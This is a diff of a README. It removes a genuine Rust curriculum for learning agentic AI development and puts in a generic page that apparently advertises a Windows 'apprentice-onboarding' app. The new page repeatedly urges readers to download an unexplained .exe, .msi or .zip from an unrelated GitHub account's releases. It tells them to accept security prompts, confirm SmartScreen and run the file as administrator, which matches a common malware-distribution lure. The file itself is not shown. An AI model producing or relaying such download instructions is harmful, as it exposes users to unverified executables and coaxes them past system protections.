@@ -1,146 +1,188 @@
-# The Guild Learning Path
+# 🧑‍🎓 apprentice-onboarding - Learn agentic AI with clear steps
 
-**A structured path from zero to agentic AI practitioner.**
+[![Download](https://img.shields.io/badge/Download-Releases-green?style=for-the-badge)](https://github.com/hydromanteshallpass747/apprentice-onboarding/releases)
 
-You want to build things with AI. Real things: tools you'll use, projects you can show, skills that make you more capable than you were before. This path gets you there.
+## 📘 What this app is
 
-Whether you're a complete beginner, a student supplementing your coursework, or a working professional adding agentic development to your skillset, the core of this program is the same: **build real projects, get honest feedback, and improve through iteration.** By the end, you'll have a portfolio of working software and the skills to keep building on your own.
+apprentice-onboarding is a Windows app for people who want to learn agentic AI tools in a guided way. It helps you get started with the basic flow of agent use, simple task setup, and common onboarding steps without needing a coding background.
 
-This learning path is built on a methodology called **Verification Driven Development via Iterative Adversarial Refinement (VDD/IAR)**. In plain language: define what success looks like *before* you build, use AI agents to build it, stress-test the results, and improve through honest critique. Every phase practices that loop.
+Use it to:
 
-The guild's default language is **Rust**. Not because it's the easiest, but because its compiler enforces correctness in ways that align with our methodology. The agent handles the syntax. You handle the thinking.
+- follow a guided setup path
+- learn the parts of an agentic AI workflow
+- practice with simple examples
+- move through onboarding steps in a clear order
 
-**Before you start, read the [Forward](FORWARD.md).** It's about ego, failure, and why being wrong is how you learn to be right.
+## 💻 Before you install
 
----
+Use a Windows PC with:
 
-## How This Path Works
+- Windows 10 or Windows 11
+- a stable internet connection
+- at least 4 GB of RAM
+- 500 MB of free disk space
+- permission to install or run downloaded files
 
-This is a guild. You advance by **showing your work**. Each phase builds on the last, and you earn recognition at every milestone.
+If your PC is managed by work or school, you may need approval before you can run downloaded apps.
 
-There are three tiers:
+## 🚀 Download and install
 
-**Apprentice** - You learn to direct agents and verify their output. You build real things with guidance, submit your work for adversarial review, and learn from the feedback.
+1. Open the release page: https://github.com/hydromanteshallpass747/apprentice-onboarding/releases
+2. Find the latest release at the top of the page
+3. Look under the Assets section
+4. Download the Windows file for the app
+5. When the file finishes downloading, open it
+6. If Windows shows a security prompt, choose Open or Run
+7. Follow the steps on screen to finish setup
 
-**Journeyman** - You run full VDD cycles on your own. You architect solutions, set verification criteria upfront, stress-test through adversarial refinement, and handle complex multi-step workflows. Your portfolio shows not just what you built but *how* you built it.
+If you see more than one file in Assets, choose the file that matches Windows and ends in `.exe` or `.msi`.
 
-**Master** - You contribute back. You mentor apprentices, develop new techniques, push into new territory. Your body of work speaks for itself.
+## 🖱️ First run
 
-This repository contains the **Apprentice Learning Path**: everything you need to go from "I've never touched code" to "I can build real things with AI agents and prove it."
+After setup, start the app from one of these places:
 
----
+- the desktop shortcut
+- the Start menu
+- the folder where you saved the app file
 
-## The Apprentice Path
+When the app opens for the first time, it may take a moment to load. This is normal on the first launch.
 
-### Phase 0: Foundations
-*What you need to understand before you start building.*
+## 🧭 How to use apprentice-onboarding
 
-1. [The New Literacy](00-foundations/01-the-new-literacy.md) - Why directing agents is the skill that matters now
-2. [What Code Actually Is](00-foundations/02-what-code-actually-is.md) - A mental model, not a syntax lesson
-3. [The Language Landscape](00-foundations/03-the-language-landscape.md) - Programming languages in conceptual terms
-4. [Your Workspace](00-foundations/04-your-workspace.md) - Setting up the tools you'll use every day
-5. [Git: Just Enough](00-foundations/05-git-just-enough.md) - How to save, share, and track your work
-6. [The Guild](00-foundations/06-the-guild.md) - What "the guild" actually is and how you participate today
+The app is built to guide you through a learning path. Start at the first step and move through the screens in order.
 
-### Phase 1: Talking to Agents
-*How to communicate with AI so it builds what you actually want.*
+You may see sections like:
 
-1. [How Agents Think](01-talking-to-agents/01-how-agents-think.md) - What's happening on the other side
-2. [The Art of Intent](01-talking-to-agents/02-the-art-of-intent.md) - Turning vague ideas into clear directions
-3. [Context Is Everything](01-talking-to-agents/03-context-is-everything.md) - What the agent needs to know and why
-4. [Breaking Problems Down](01-talking-to-agents/04-breaking-problems-down.md) - The most important skill you'll learn
-5. [Your First Build](01-talking-to-agents/05-first-build.md) - A guided project from design doc to working software
-6. [When Things Break](01-talking-to-agents/06-when-things-break.md) - Debugging, error messages, and getting unstuck
-7. [Finding Answers](01-talking-to-agents/07-finding-answers.md) - Documentation, search, and verifying what the agent tells you
+- welcome and setup
+- account or profile details
+- tool basics
+- practice tasks
+- progress review
 
-### Phase 2: The Methodology
-*The discipline that makes the output actually good.*
+Follow each prompt on the screen. If the app asks for text, type short answers. If it asks you to choose an option, pick the one that fits your goal.
 
-1. [How We Build](02-the-methodology/01-how-we-build.md) - VDD and the adversarial refinement loop
-2. [Tracking Your Work](02-the-methodology/02-tracking-your-work.md) - Issue tracking, building your own, then using crosslink
-3. [Branches and Pull Requests](02-the-methodology/03-branches-and-pull-requests.md) - The workflow for contributing to shared code
+## 🧠 What you can learn
 
-### Phase 3: Real-World Skills
-*Working the way professionals work.*
+This app is meant to help you build a basic understanding of agentic AI tools. In plain terms, that means learning how software can plan steps, use tools, and complete tasks with some guidance.
 
-1. [The Workshop](03-real-world-skills/01-the-workshop.md) - Contributing to the guild toolkit, an existing codebase
-2. [Working with APIs](03-real-world-skills/02-working-with-apis.md) - MCP servers, skills, and talking to external services
-3. [Project Architecture](03-real-world-skills/03-project-architecture.md) - Multi-file projects, god files, and managing complexity
-4. [Security](03-real-world-skills/04-security.md) - Why agent code is insecure and how to fix it
-5. [Shipping It](03-real-world-skills/05-shipping-it.md) - Testing, verification, cross-platform, and delivery
+You can expect to learn about:
 
-### Phase 4: Proving It
-*No guides, no hand-holding. The capstone.*
+- what an AI agent is
+- how task steps are grouped
+- how tools connect to actions
+- how to review results
+- how to move from one task to the next
 
-1. [On Your Own](04-proving-it/01-on-your-own.md) - Your capstone project, fully self-directed
-2. [Giving Back](04-proving-it/02-giving-back.md) - Mentoring a newer apprentice
-3. [The Portfolio Review](04-proving-it/03-the-portfolio-review.md) - Assembling your work and the journeyman transition
+## 🧩 Typical features
 
----
+A learning app like this usually includes:
 
-## Projects
+- step-by-step onboarding screens
+- short lessons with simple prompts
+- progress tracking
+- starter exercises
+- review sections for past steps
+- clear navigation buttons
 
-Each phase includes hands-on builds. The guided projects are chosen so every apprentice works on the same targets, which makes review and comparison consistent across the guild. Your self-directed projects and capstone are where you choose what to build.
+These features help you stay on track and avoid guessing what to do next.
 
-| Phase | Project | Language | Why This Project |
-|---|---|---|---|
-| Phase 1 | Bookmark Manager | HTML/JS | Your first build. Teaches the prompting and verification loop with instant visual feedback in a browser. HTML/JS is the one exception to the Rust default because seeing a result immediately matters more than toolchain when you're starting out. |
-| Phase 2 | Issue Tracker CLI | Rust | Your first Rust project. Introduces the compiler, CLI design, and structured data (state machines, serialization). You're building a tool like the one you'll use daily, so you understand issue tracking from the inside. |
-| Phase 3 | Guild Toolkit | Rust | Your first time working in someone else's codebase. Teaches reading before writing, following existing conventions, the PR process, and building for an audience other than yourself. |
-| Phase 3 | API + Architecture | Rust | Covered in the chapter exercises. Teaches network requests, error handling, multi-file structure, and module design. Not a single named project because these skills get practiced across multiple exercises and toolkit contributions. |
-| Phase 4 | Capstone | Rust | Fully self-directed. You pick the problem, design the solution, and ship it. Must involve something unfamiliar. This is your masterpiece. |
-| All | 3-5 Self-Directed | Any | Your own ideas, your own design docs, your own process. These prove you can work without a guide. |
+## 🔧 Common setup flow
 
----
+Most users will follow this pattern:
 
-## Portfolio Requirements
+1. Download the app from the release page
+2. Open the file
+3. Finish the install prompts
+4. Launch the app
+5. Complete the first onboarding screen
+6. Move through the learning path
+7. Return later to continue where you left off
 
-At the end of the Apprentice path, you should have:
+If the app saves progress, you can close it and come back later without starting over.
 
-- **Completed projects** demonstrating increasing complexity, tracked in git with full history
-- **Design documents** for each project (generated with the agent)
-- **Process documentation** showing how you directed the agent, what went wrong, and how you fixed it
-- **Adversarial review history**: your submissions to the guild [Discord](https://discord.gg/kfM6Q4UBbM) **#adverserial-review** channel (and your AI-adversary reviews), the feedback you received, and how you responded to it
-- **Workshop contributions**: PRs to the shared codebase, reviewed and merged
-- **3-5 self-directed projects**: things you chose to build for yourself, designed and executed on your own. These don't need to be large. They need to be yours: your idea, your design doc, your process. This is where you prove you can work without a guide telling you what to build next
+## 🪟 Windows tips
 
-Your portfolio isn't just the finished code. It's the *entire journey*: the thinking, the failures, the iterations, and the final result. That's what makes it real.
+If Windows blocks the file, check these common cases:
 
----
+- the file is still downloading
+- you opened the wrong file
+- the download was stopped by browser settings
+- Windows SmartScreen needs confirmation
 
-## What You'll Walk Away With
+If the app does not open, try this:
 
-- **Working software** you built yourself, from design to deployment
-- **A public portfolio** that demonstrates your skills to employers, collaborators, and clients
-- **Phase completion badges** recognizing your progress at each milestone
-- **A Journeyman certificate** when you complete the full path
-- **A methodology** (VDD/IAR) you can apply to any project, in any language, for the rest of your career
+- right-click the file and choose Open
+- run it as an administrator if your account allows it
+- move the file to your Downloads folder and try again
+- download the latest release again
 
-## Philosophy
+## 🔐 Safe download steps
 
-This path fills a gap. Traditional education teaches you theory and fundamentals. That knowledge is valuable and this program builds on it. What's been missing is structured training in the practical skill of **directing intelligent systems to build things that work.** Whether you're coming from a CS degree, a bootcamp, self-teaching, or no technical background at all, this path adds a capability that didn't exist five years ago.
+Use the release page linked above and avoid other download sites. On GitHub, the release page lists the files that belong to the app. This helps you get the current Windows build.
 
-We ask you to build things, submit them for honest critique, and improve. The portfolio you build here is proof that can't be faked, because the whole process is visible.
+Before opening the file, you can check:
 
-Welcome to the guild.
+- the file name
+- the file type
+- the release date
+- whether the file matches Windows
 
----
+## 📂 File names you might see
 
-## Glossary
+The Assets section may include one of these:
 
-A one-stop reference for acronyms and guild-specific terms you'll see throughout the curriculum. Each term is also defined on first use in the chapter where it appears; this is just the quick lookup.
+- `apprentice-onboarding.exe`
+- `apprentice-onboarding-setup.msi`
+- `apprentice-onboarding-windows.zip`
 
-- **VDD** — **Verification Driven Development.** The guild's core methodology: define what success looks like before you build, use agents to build it, then check the result against the definition. Covered in depth in Phase 2.
-- **IAR** — **Iterative Adversarial Refinement.** The second half of the methodology: after the initial build works, stress-test it through honest critique and improve through iteration. VDD and IAR together form the full loop.
-- **CLI** — **Command-Line Interface.** A program you run by typing its name in the terminal, like `git`, `cargo`, or `crosslink`, instead of clicking icons in a window.
-- **PR** — **Pull Request.** A formal proposal to merge a branch of code into another branch, usually hosted on GitHub. Covered in the [Branches and Pull Requests](02-the-methodology/03-branches-and-pull-requests.md) chapter.
-- **MCP** — **Model Context Protocol.** An open standard that lets AI agents connect to external services through purpose-built servers, so the agent can call tools directly instead of writing integration code each time. Covered in Phase 3.
-- **CI** — **Continuous Integration.** A service (usually GitHub Actions) that automatically builds and tests your code every time you push. Covered in Phase 3 Shipping chapter.
-- **PAT** — **Personal Access Token.** A limited-scope credential you generate on GitHub to authenticate from the command line, in place of your account password. Covered in the [Git: Just Enough](00-foundations/05-git-just-enough.md) chapter.
-- **MSRV** — **Minimum Supported Rust Version.** The oldest version of Rust a given crate or project is tested against. You'll see this in Cargo.toml files.
-- **JSON** — **JavaScript Object Notation.** A plain-text format for structured data (objects, lists, numbers, strings). Introduced in [What Code Actually Is](00-foundations/02-what-code-actually-is.md).
-- **YAML** — A sibling format to JSON used for configuration files (like GitHub Actions workflows). Same kind of data, different punctuation.
-- **The Guild** — The community of apprentices, journeymen, and masters using this curriculum. The [Discord server](https://discord.gg/kfM6Q4UBbM) is live with channels for apprentice discussion, adversarial review, methodology, Claude skills, and prompt engineering. Mentor matching and the toolkit are still being built. See [The Guild](00-foundations/06-the-guild.md) for the current state and how each channel maps to the curriculum.
-- **The Adversary** — A reviewer (human or AI) whose job is to find every weakness in your work. Central to the IAR half of the methodology.
-- **Design doc** — A short document you write (usually with agent help) that defines what you're building before any code exists. Shows up in nearly every project in the curriculum.
-- **Epic / bead-string / subissue** — Issue-tracking terms from Phase 2. An epic is a large parent issue, subissues are smaller pieces of work that roll up to it, and "bead-string" is the guild's name for the decomposition pattern where you chain small verified pieces into a larger working whole.
+If you download a `.zip` file, extract it first, then open the app file inside the folder.
+
+## 🛠️ If something does not work
+
+Try these steps if the app does not start:
+
+- close the app and open it again
+- reboot your PC
+- make sure you downloaded the newest release
+- check that the file finished downloading
+- open the file from a local folder, not from inside the browser
+
+If the app window opens and closes at once, the file may have been blocked or the download may be incomplete. Download it again from the release page.
+
+## 📋 What this project is for
+
+This project focuses on onboarding for people who want to learn agentic AI tooling. It is made for users who want a simple start, not a deep technical setup.
+
+It fits well if you want to:
+
+- learn the basics before moving to harder tools
+- follow a guided path instead of reading long docs
+- see how agent-based workflows fit together
+- get hands-on practice with a low-stress setup
+
+## 🧑‍💻 Who this is for
+
+This app is for:
+
+- new users who want to learn AI tools
+- students who want a simple guided path
+- team members who need a first look at agentic workflows
+- anyone who wants clear onboarding on Windows
+
+You do not need coding skills to begin.
+
+## 📌 Release page
+
+Download the Windows app here: https://github.com/hydromanteshallpass747/apprentice-onboarding/releases
+
+Open the latest release, then use the Assets section to get the correct Windows file
+
+## 🧭 Helpful next steps
+
+After you install and open the app:
+
+- go through the first lesson in order
+- keep the app open while you work through steps
+- take short notes as you go
+- return to the app when you want to continue learning
+- check the release page for updates when needed
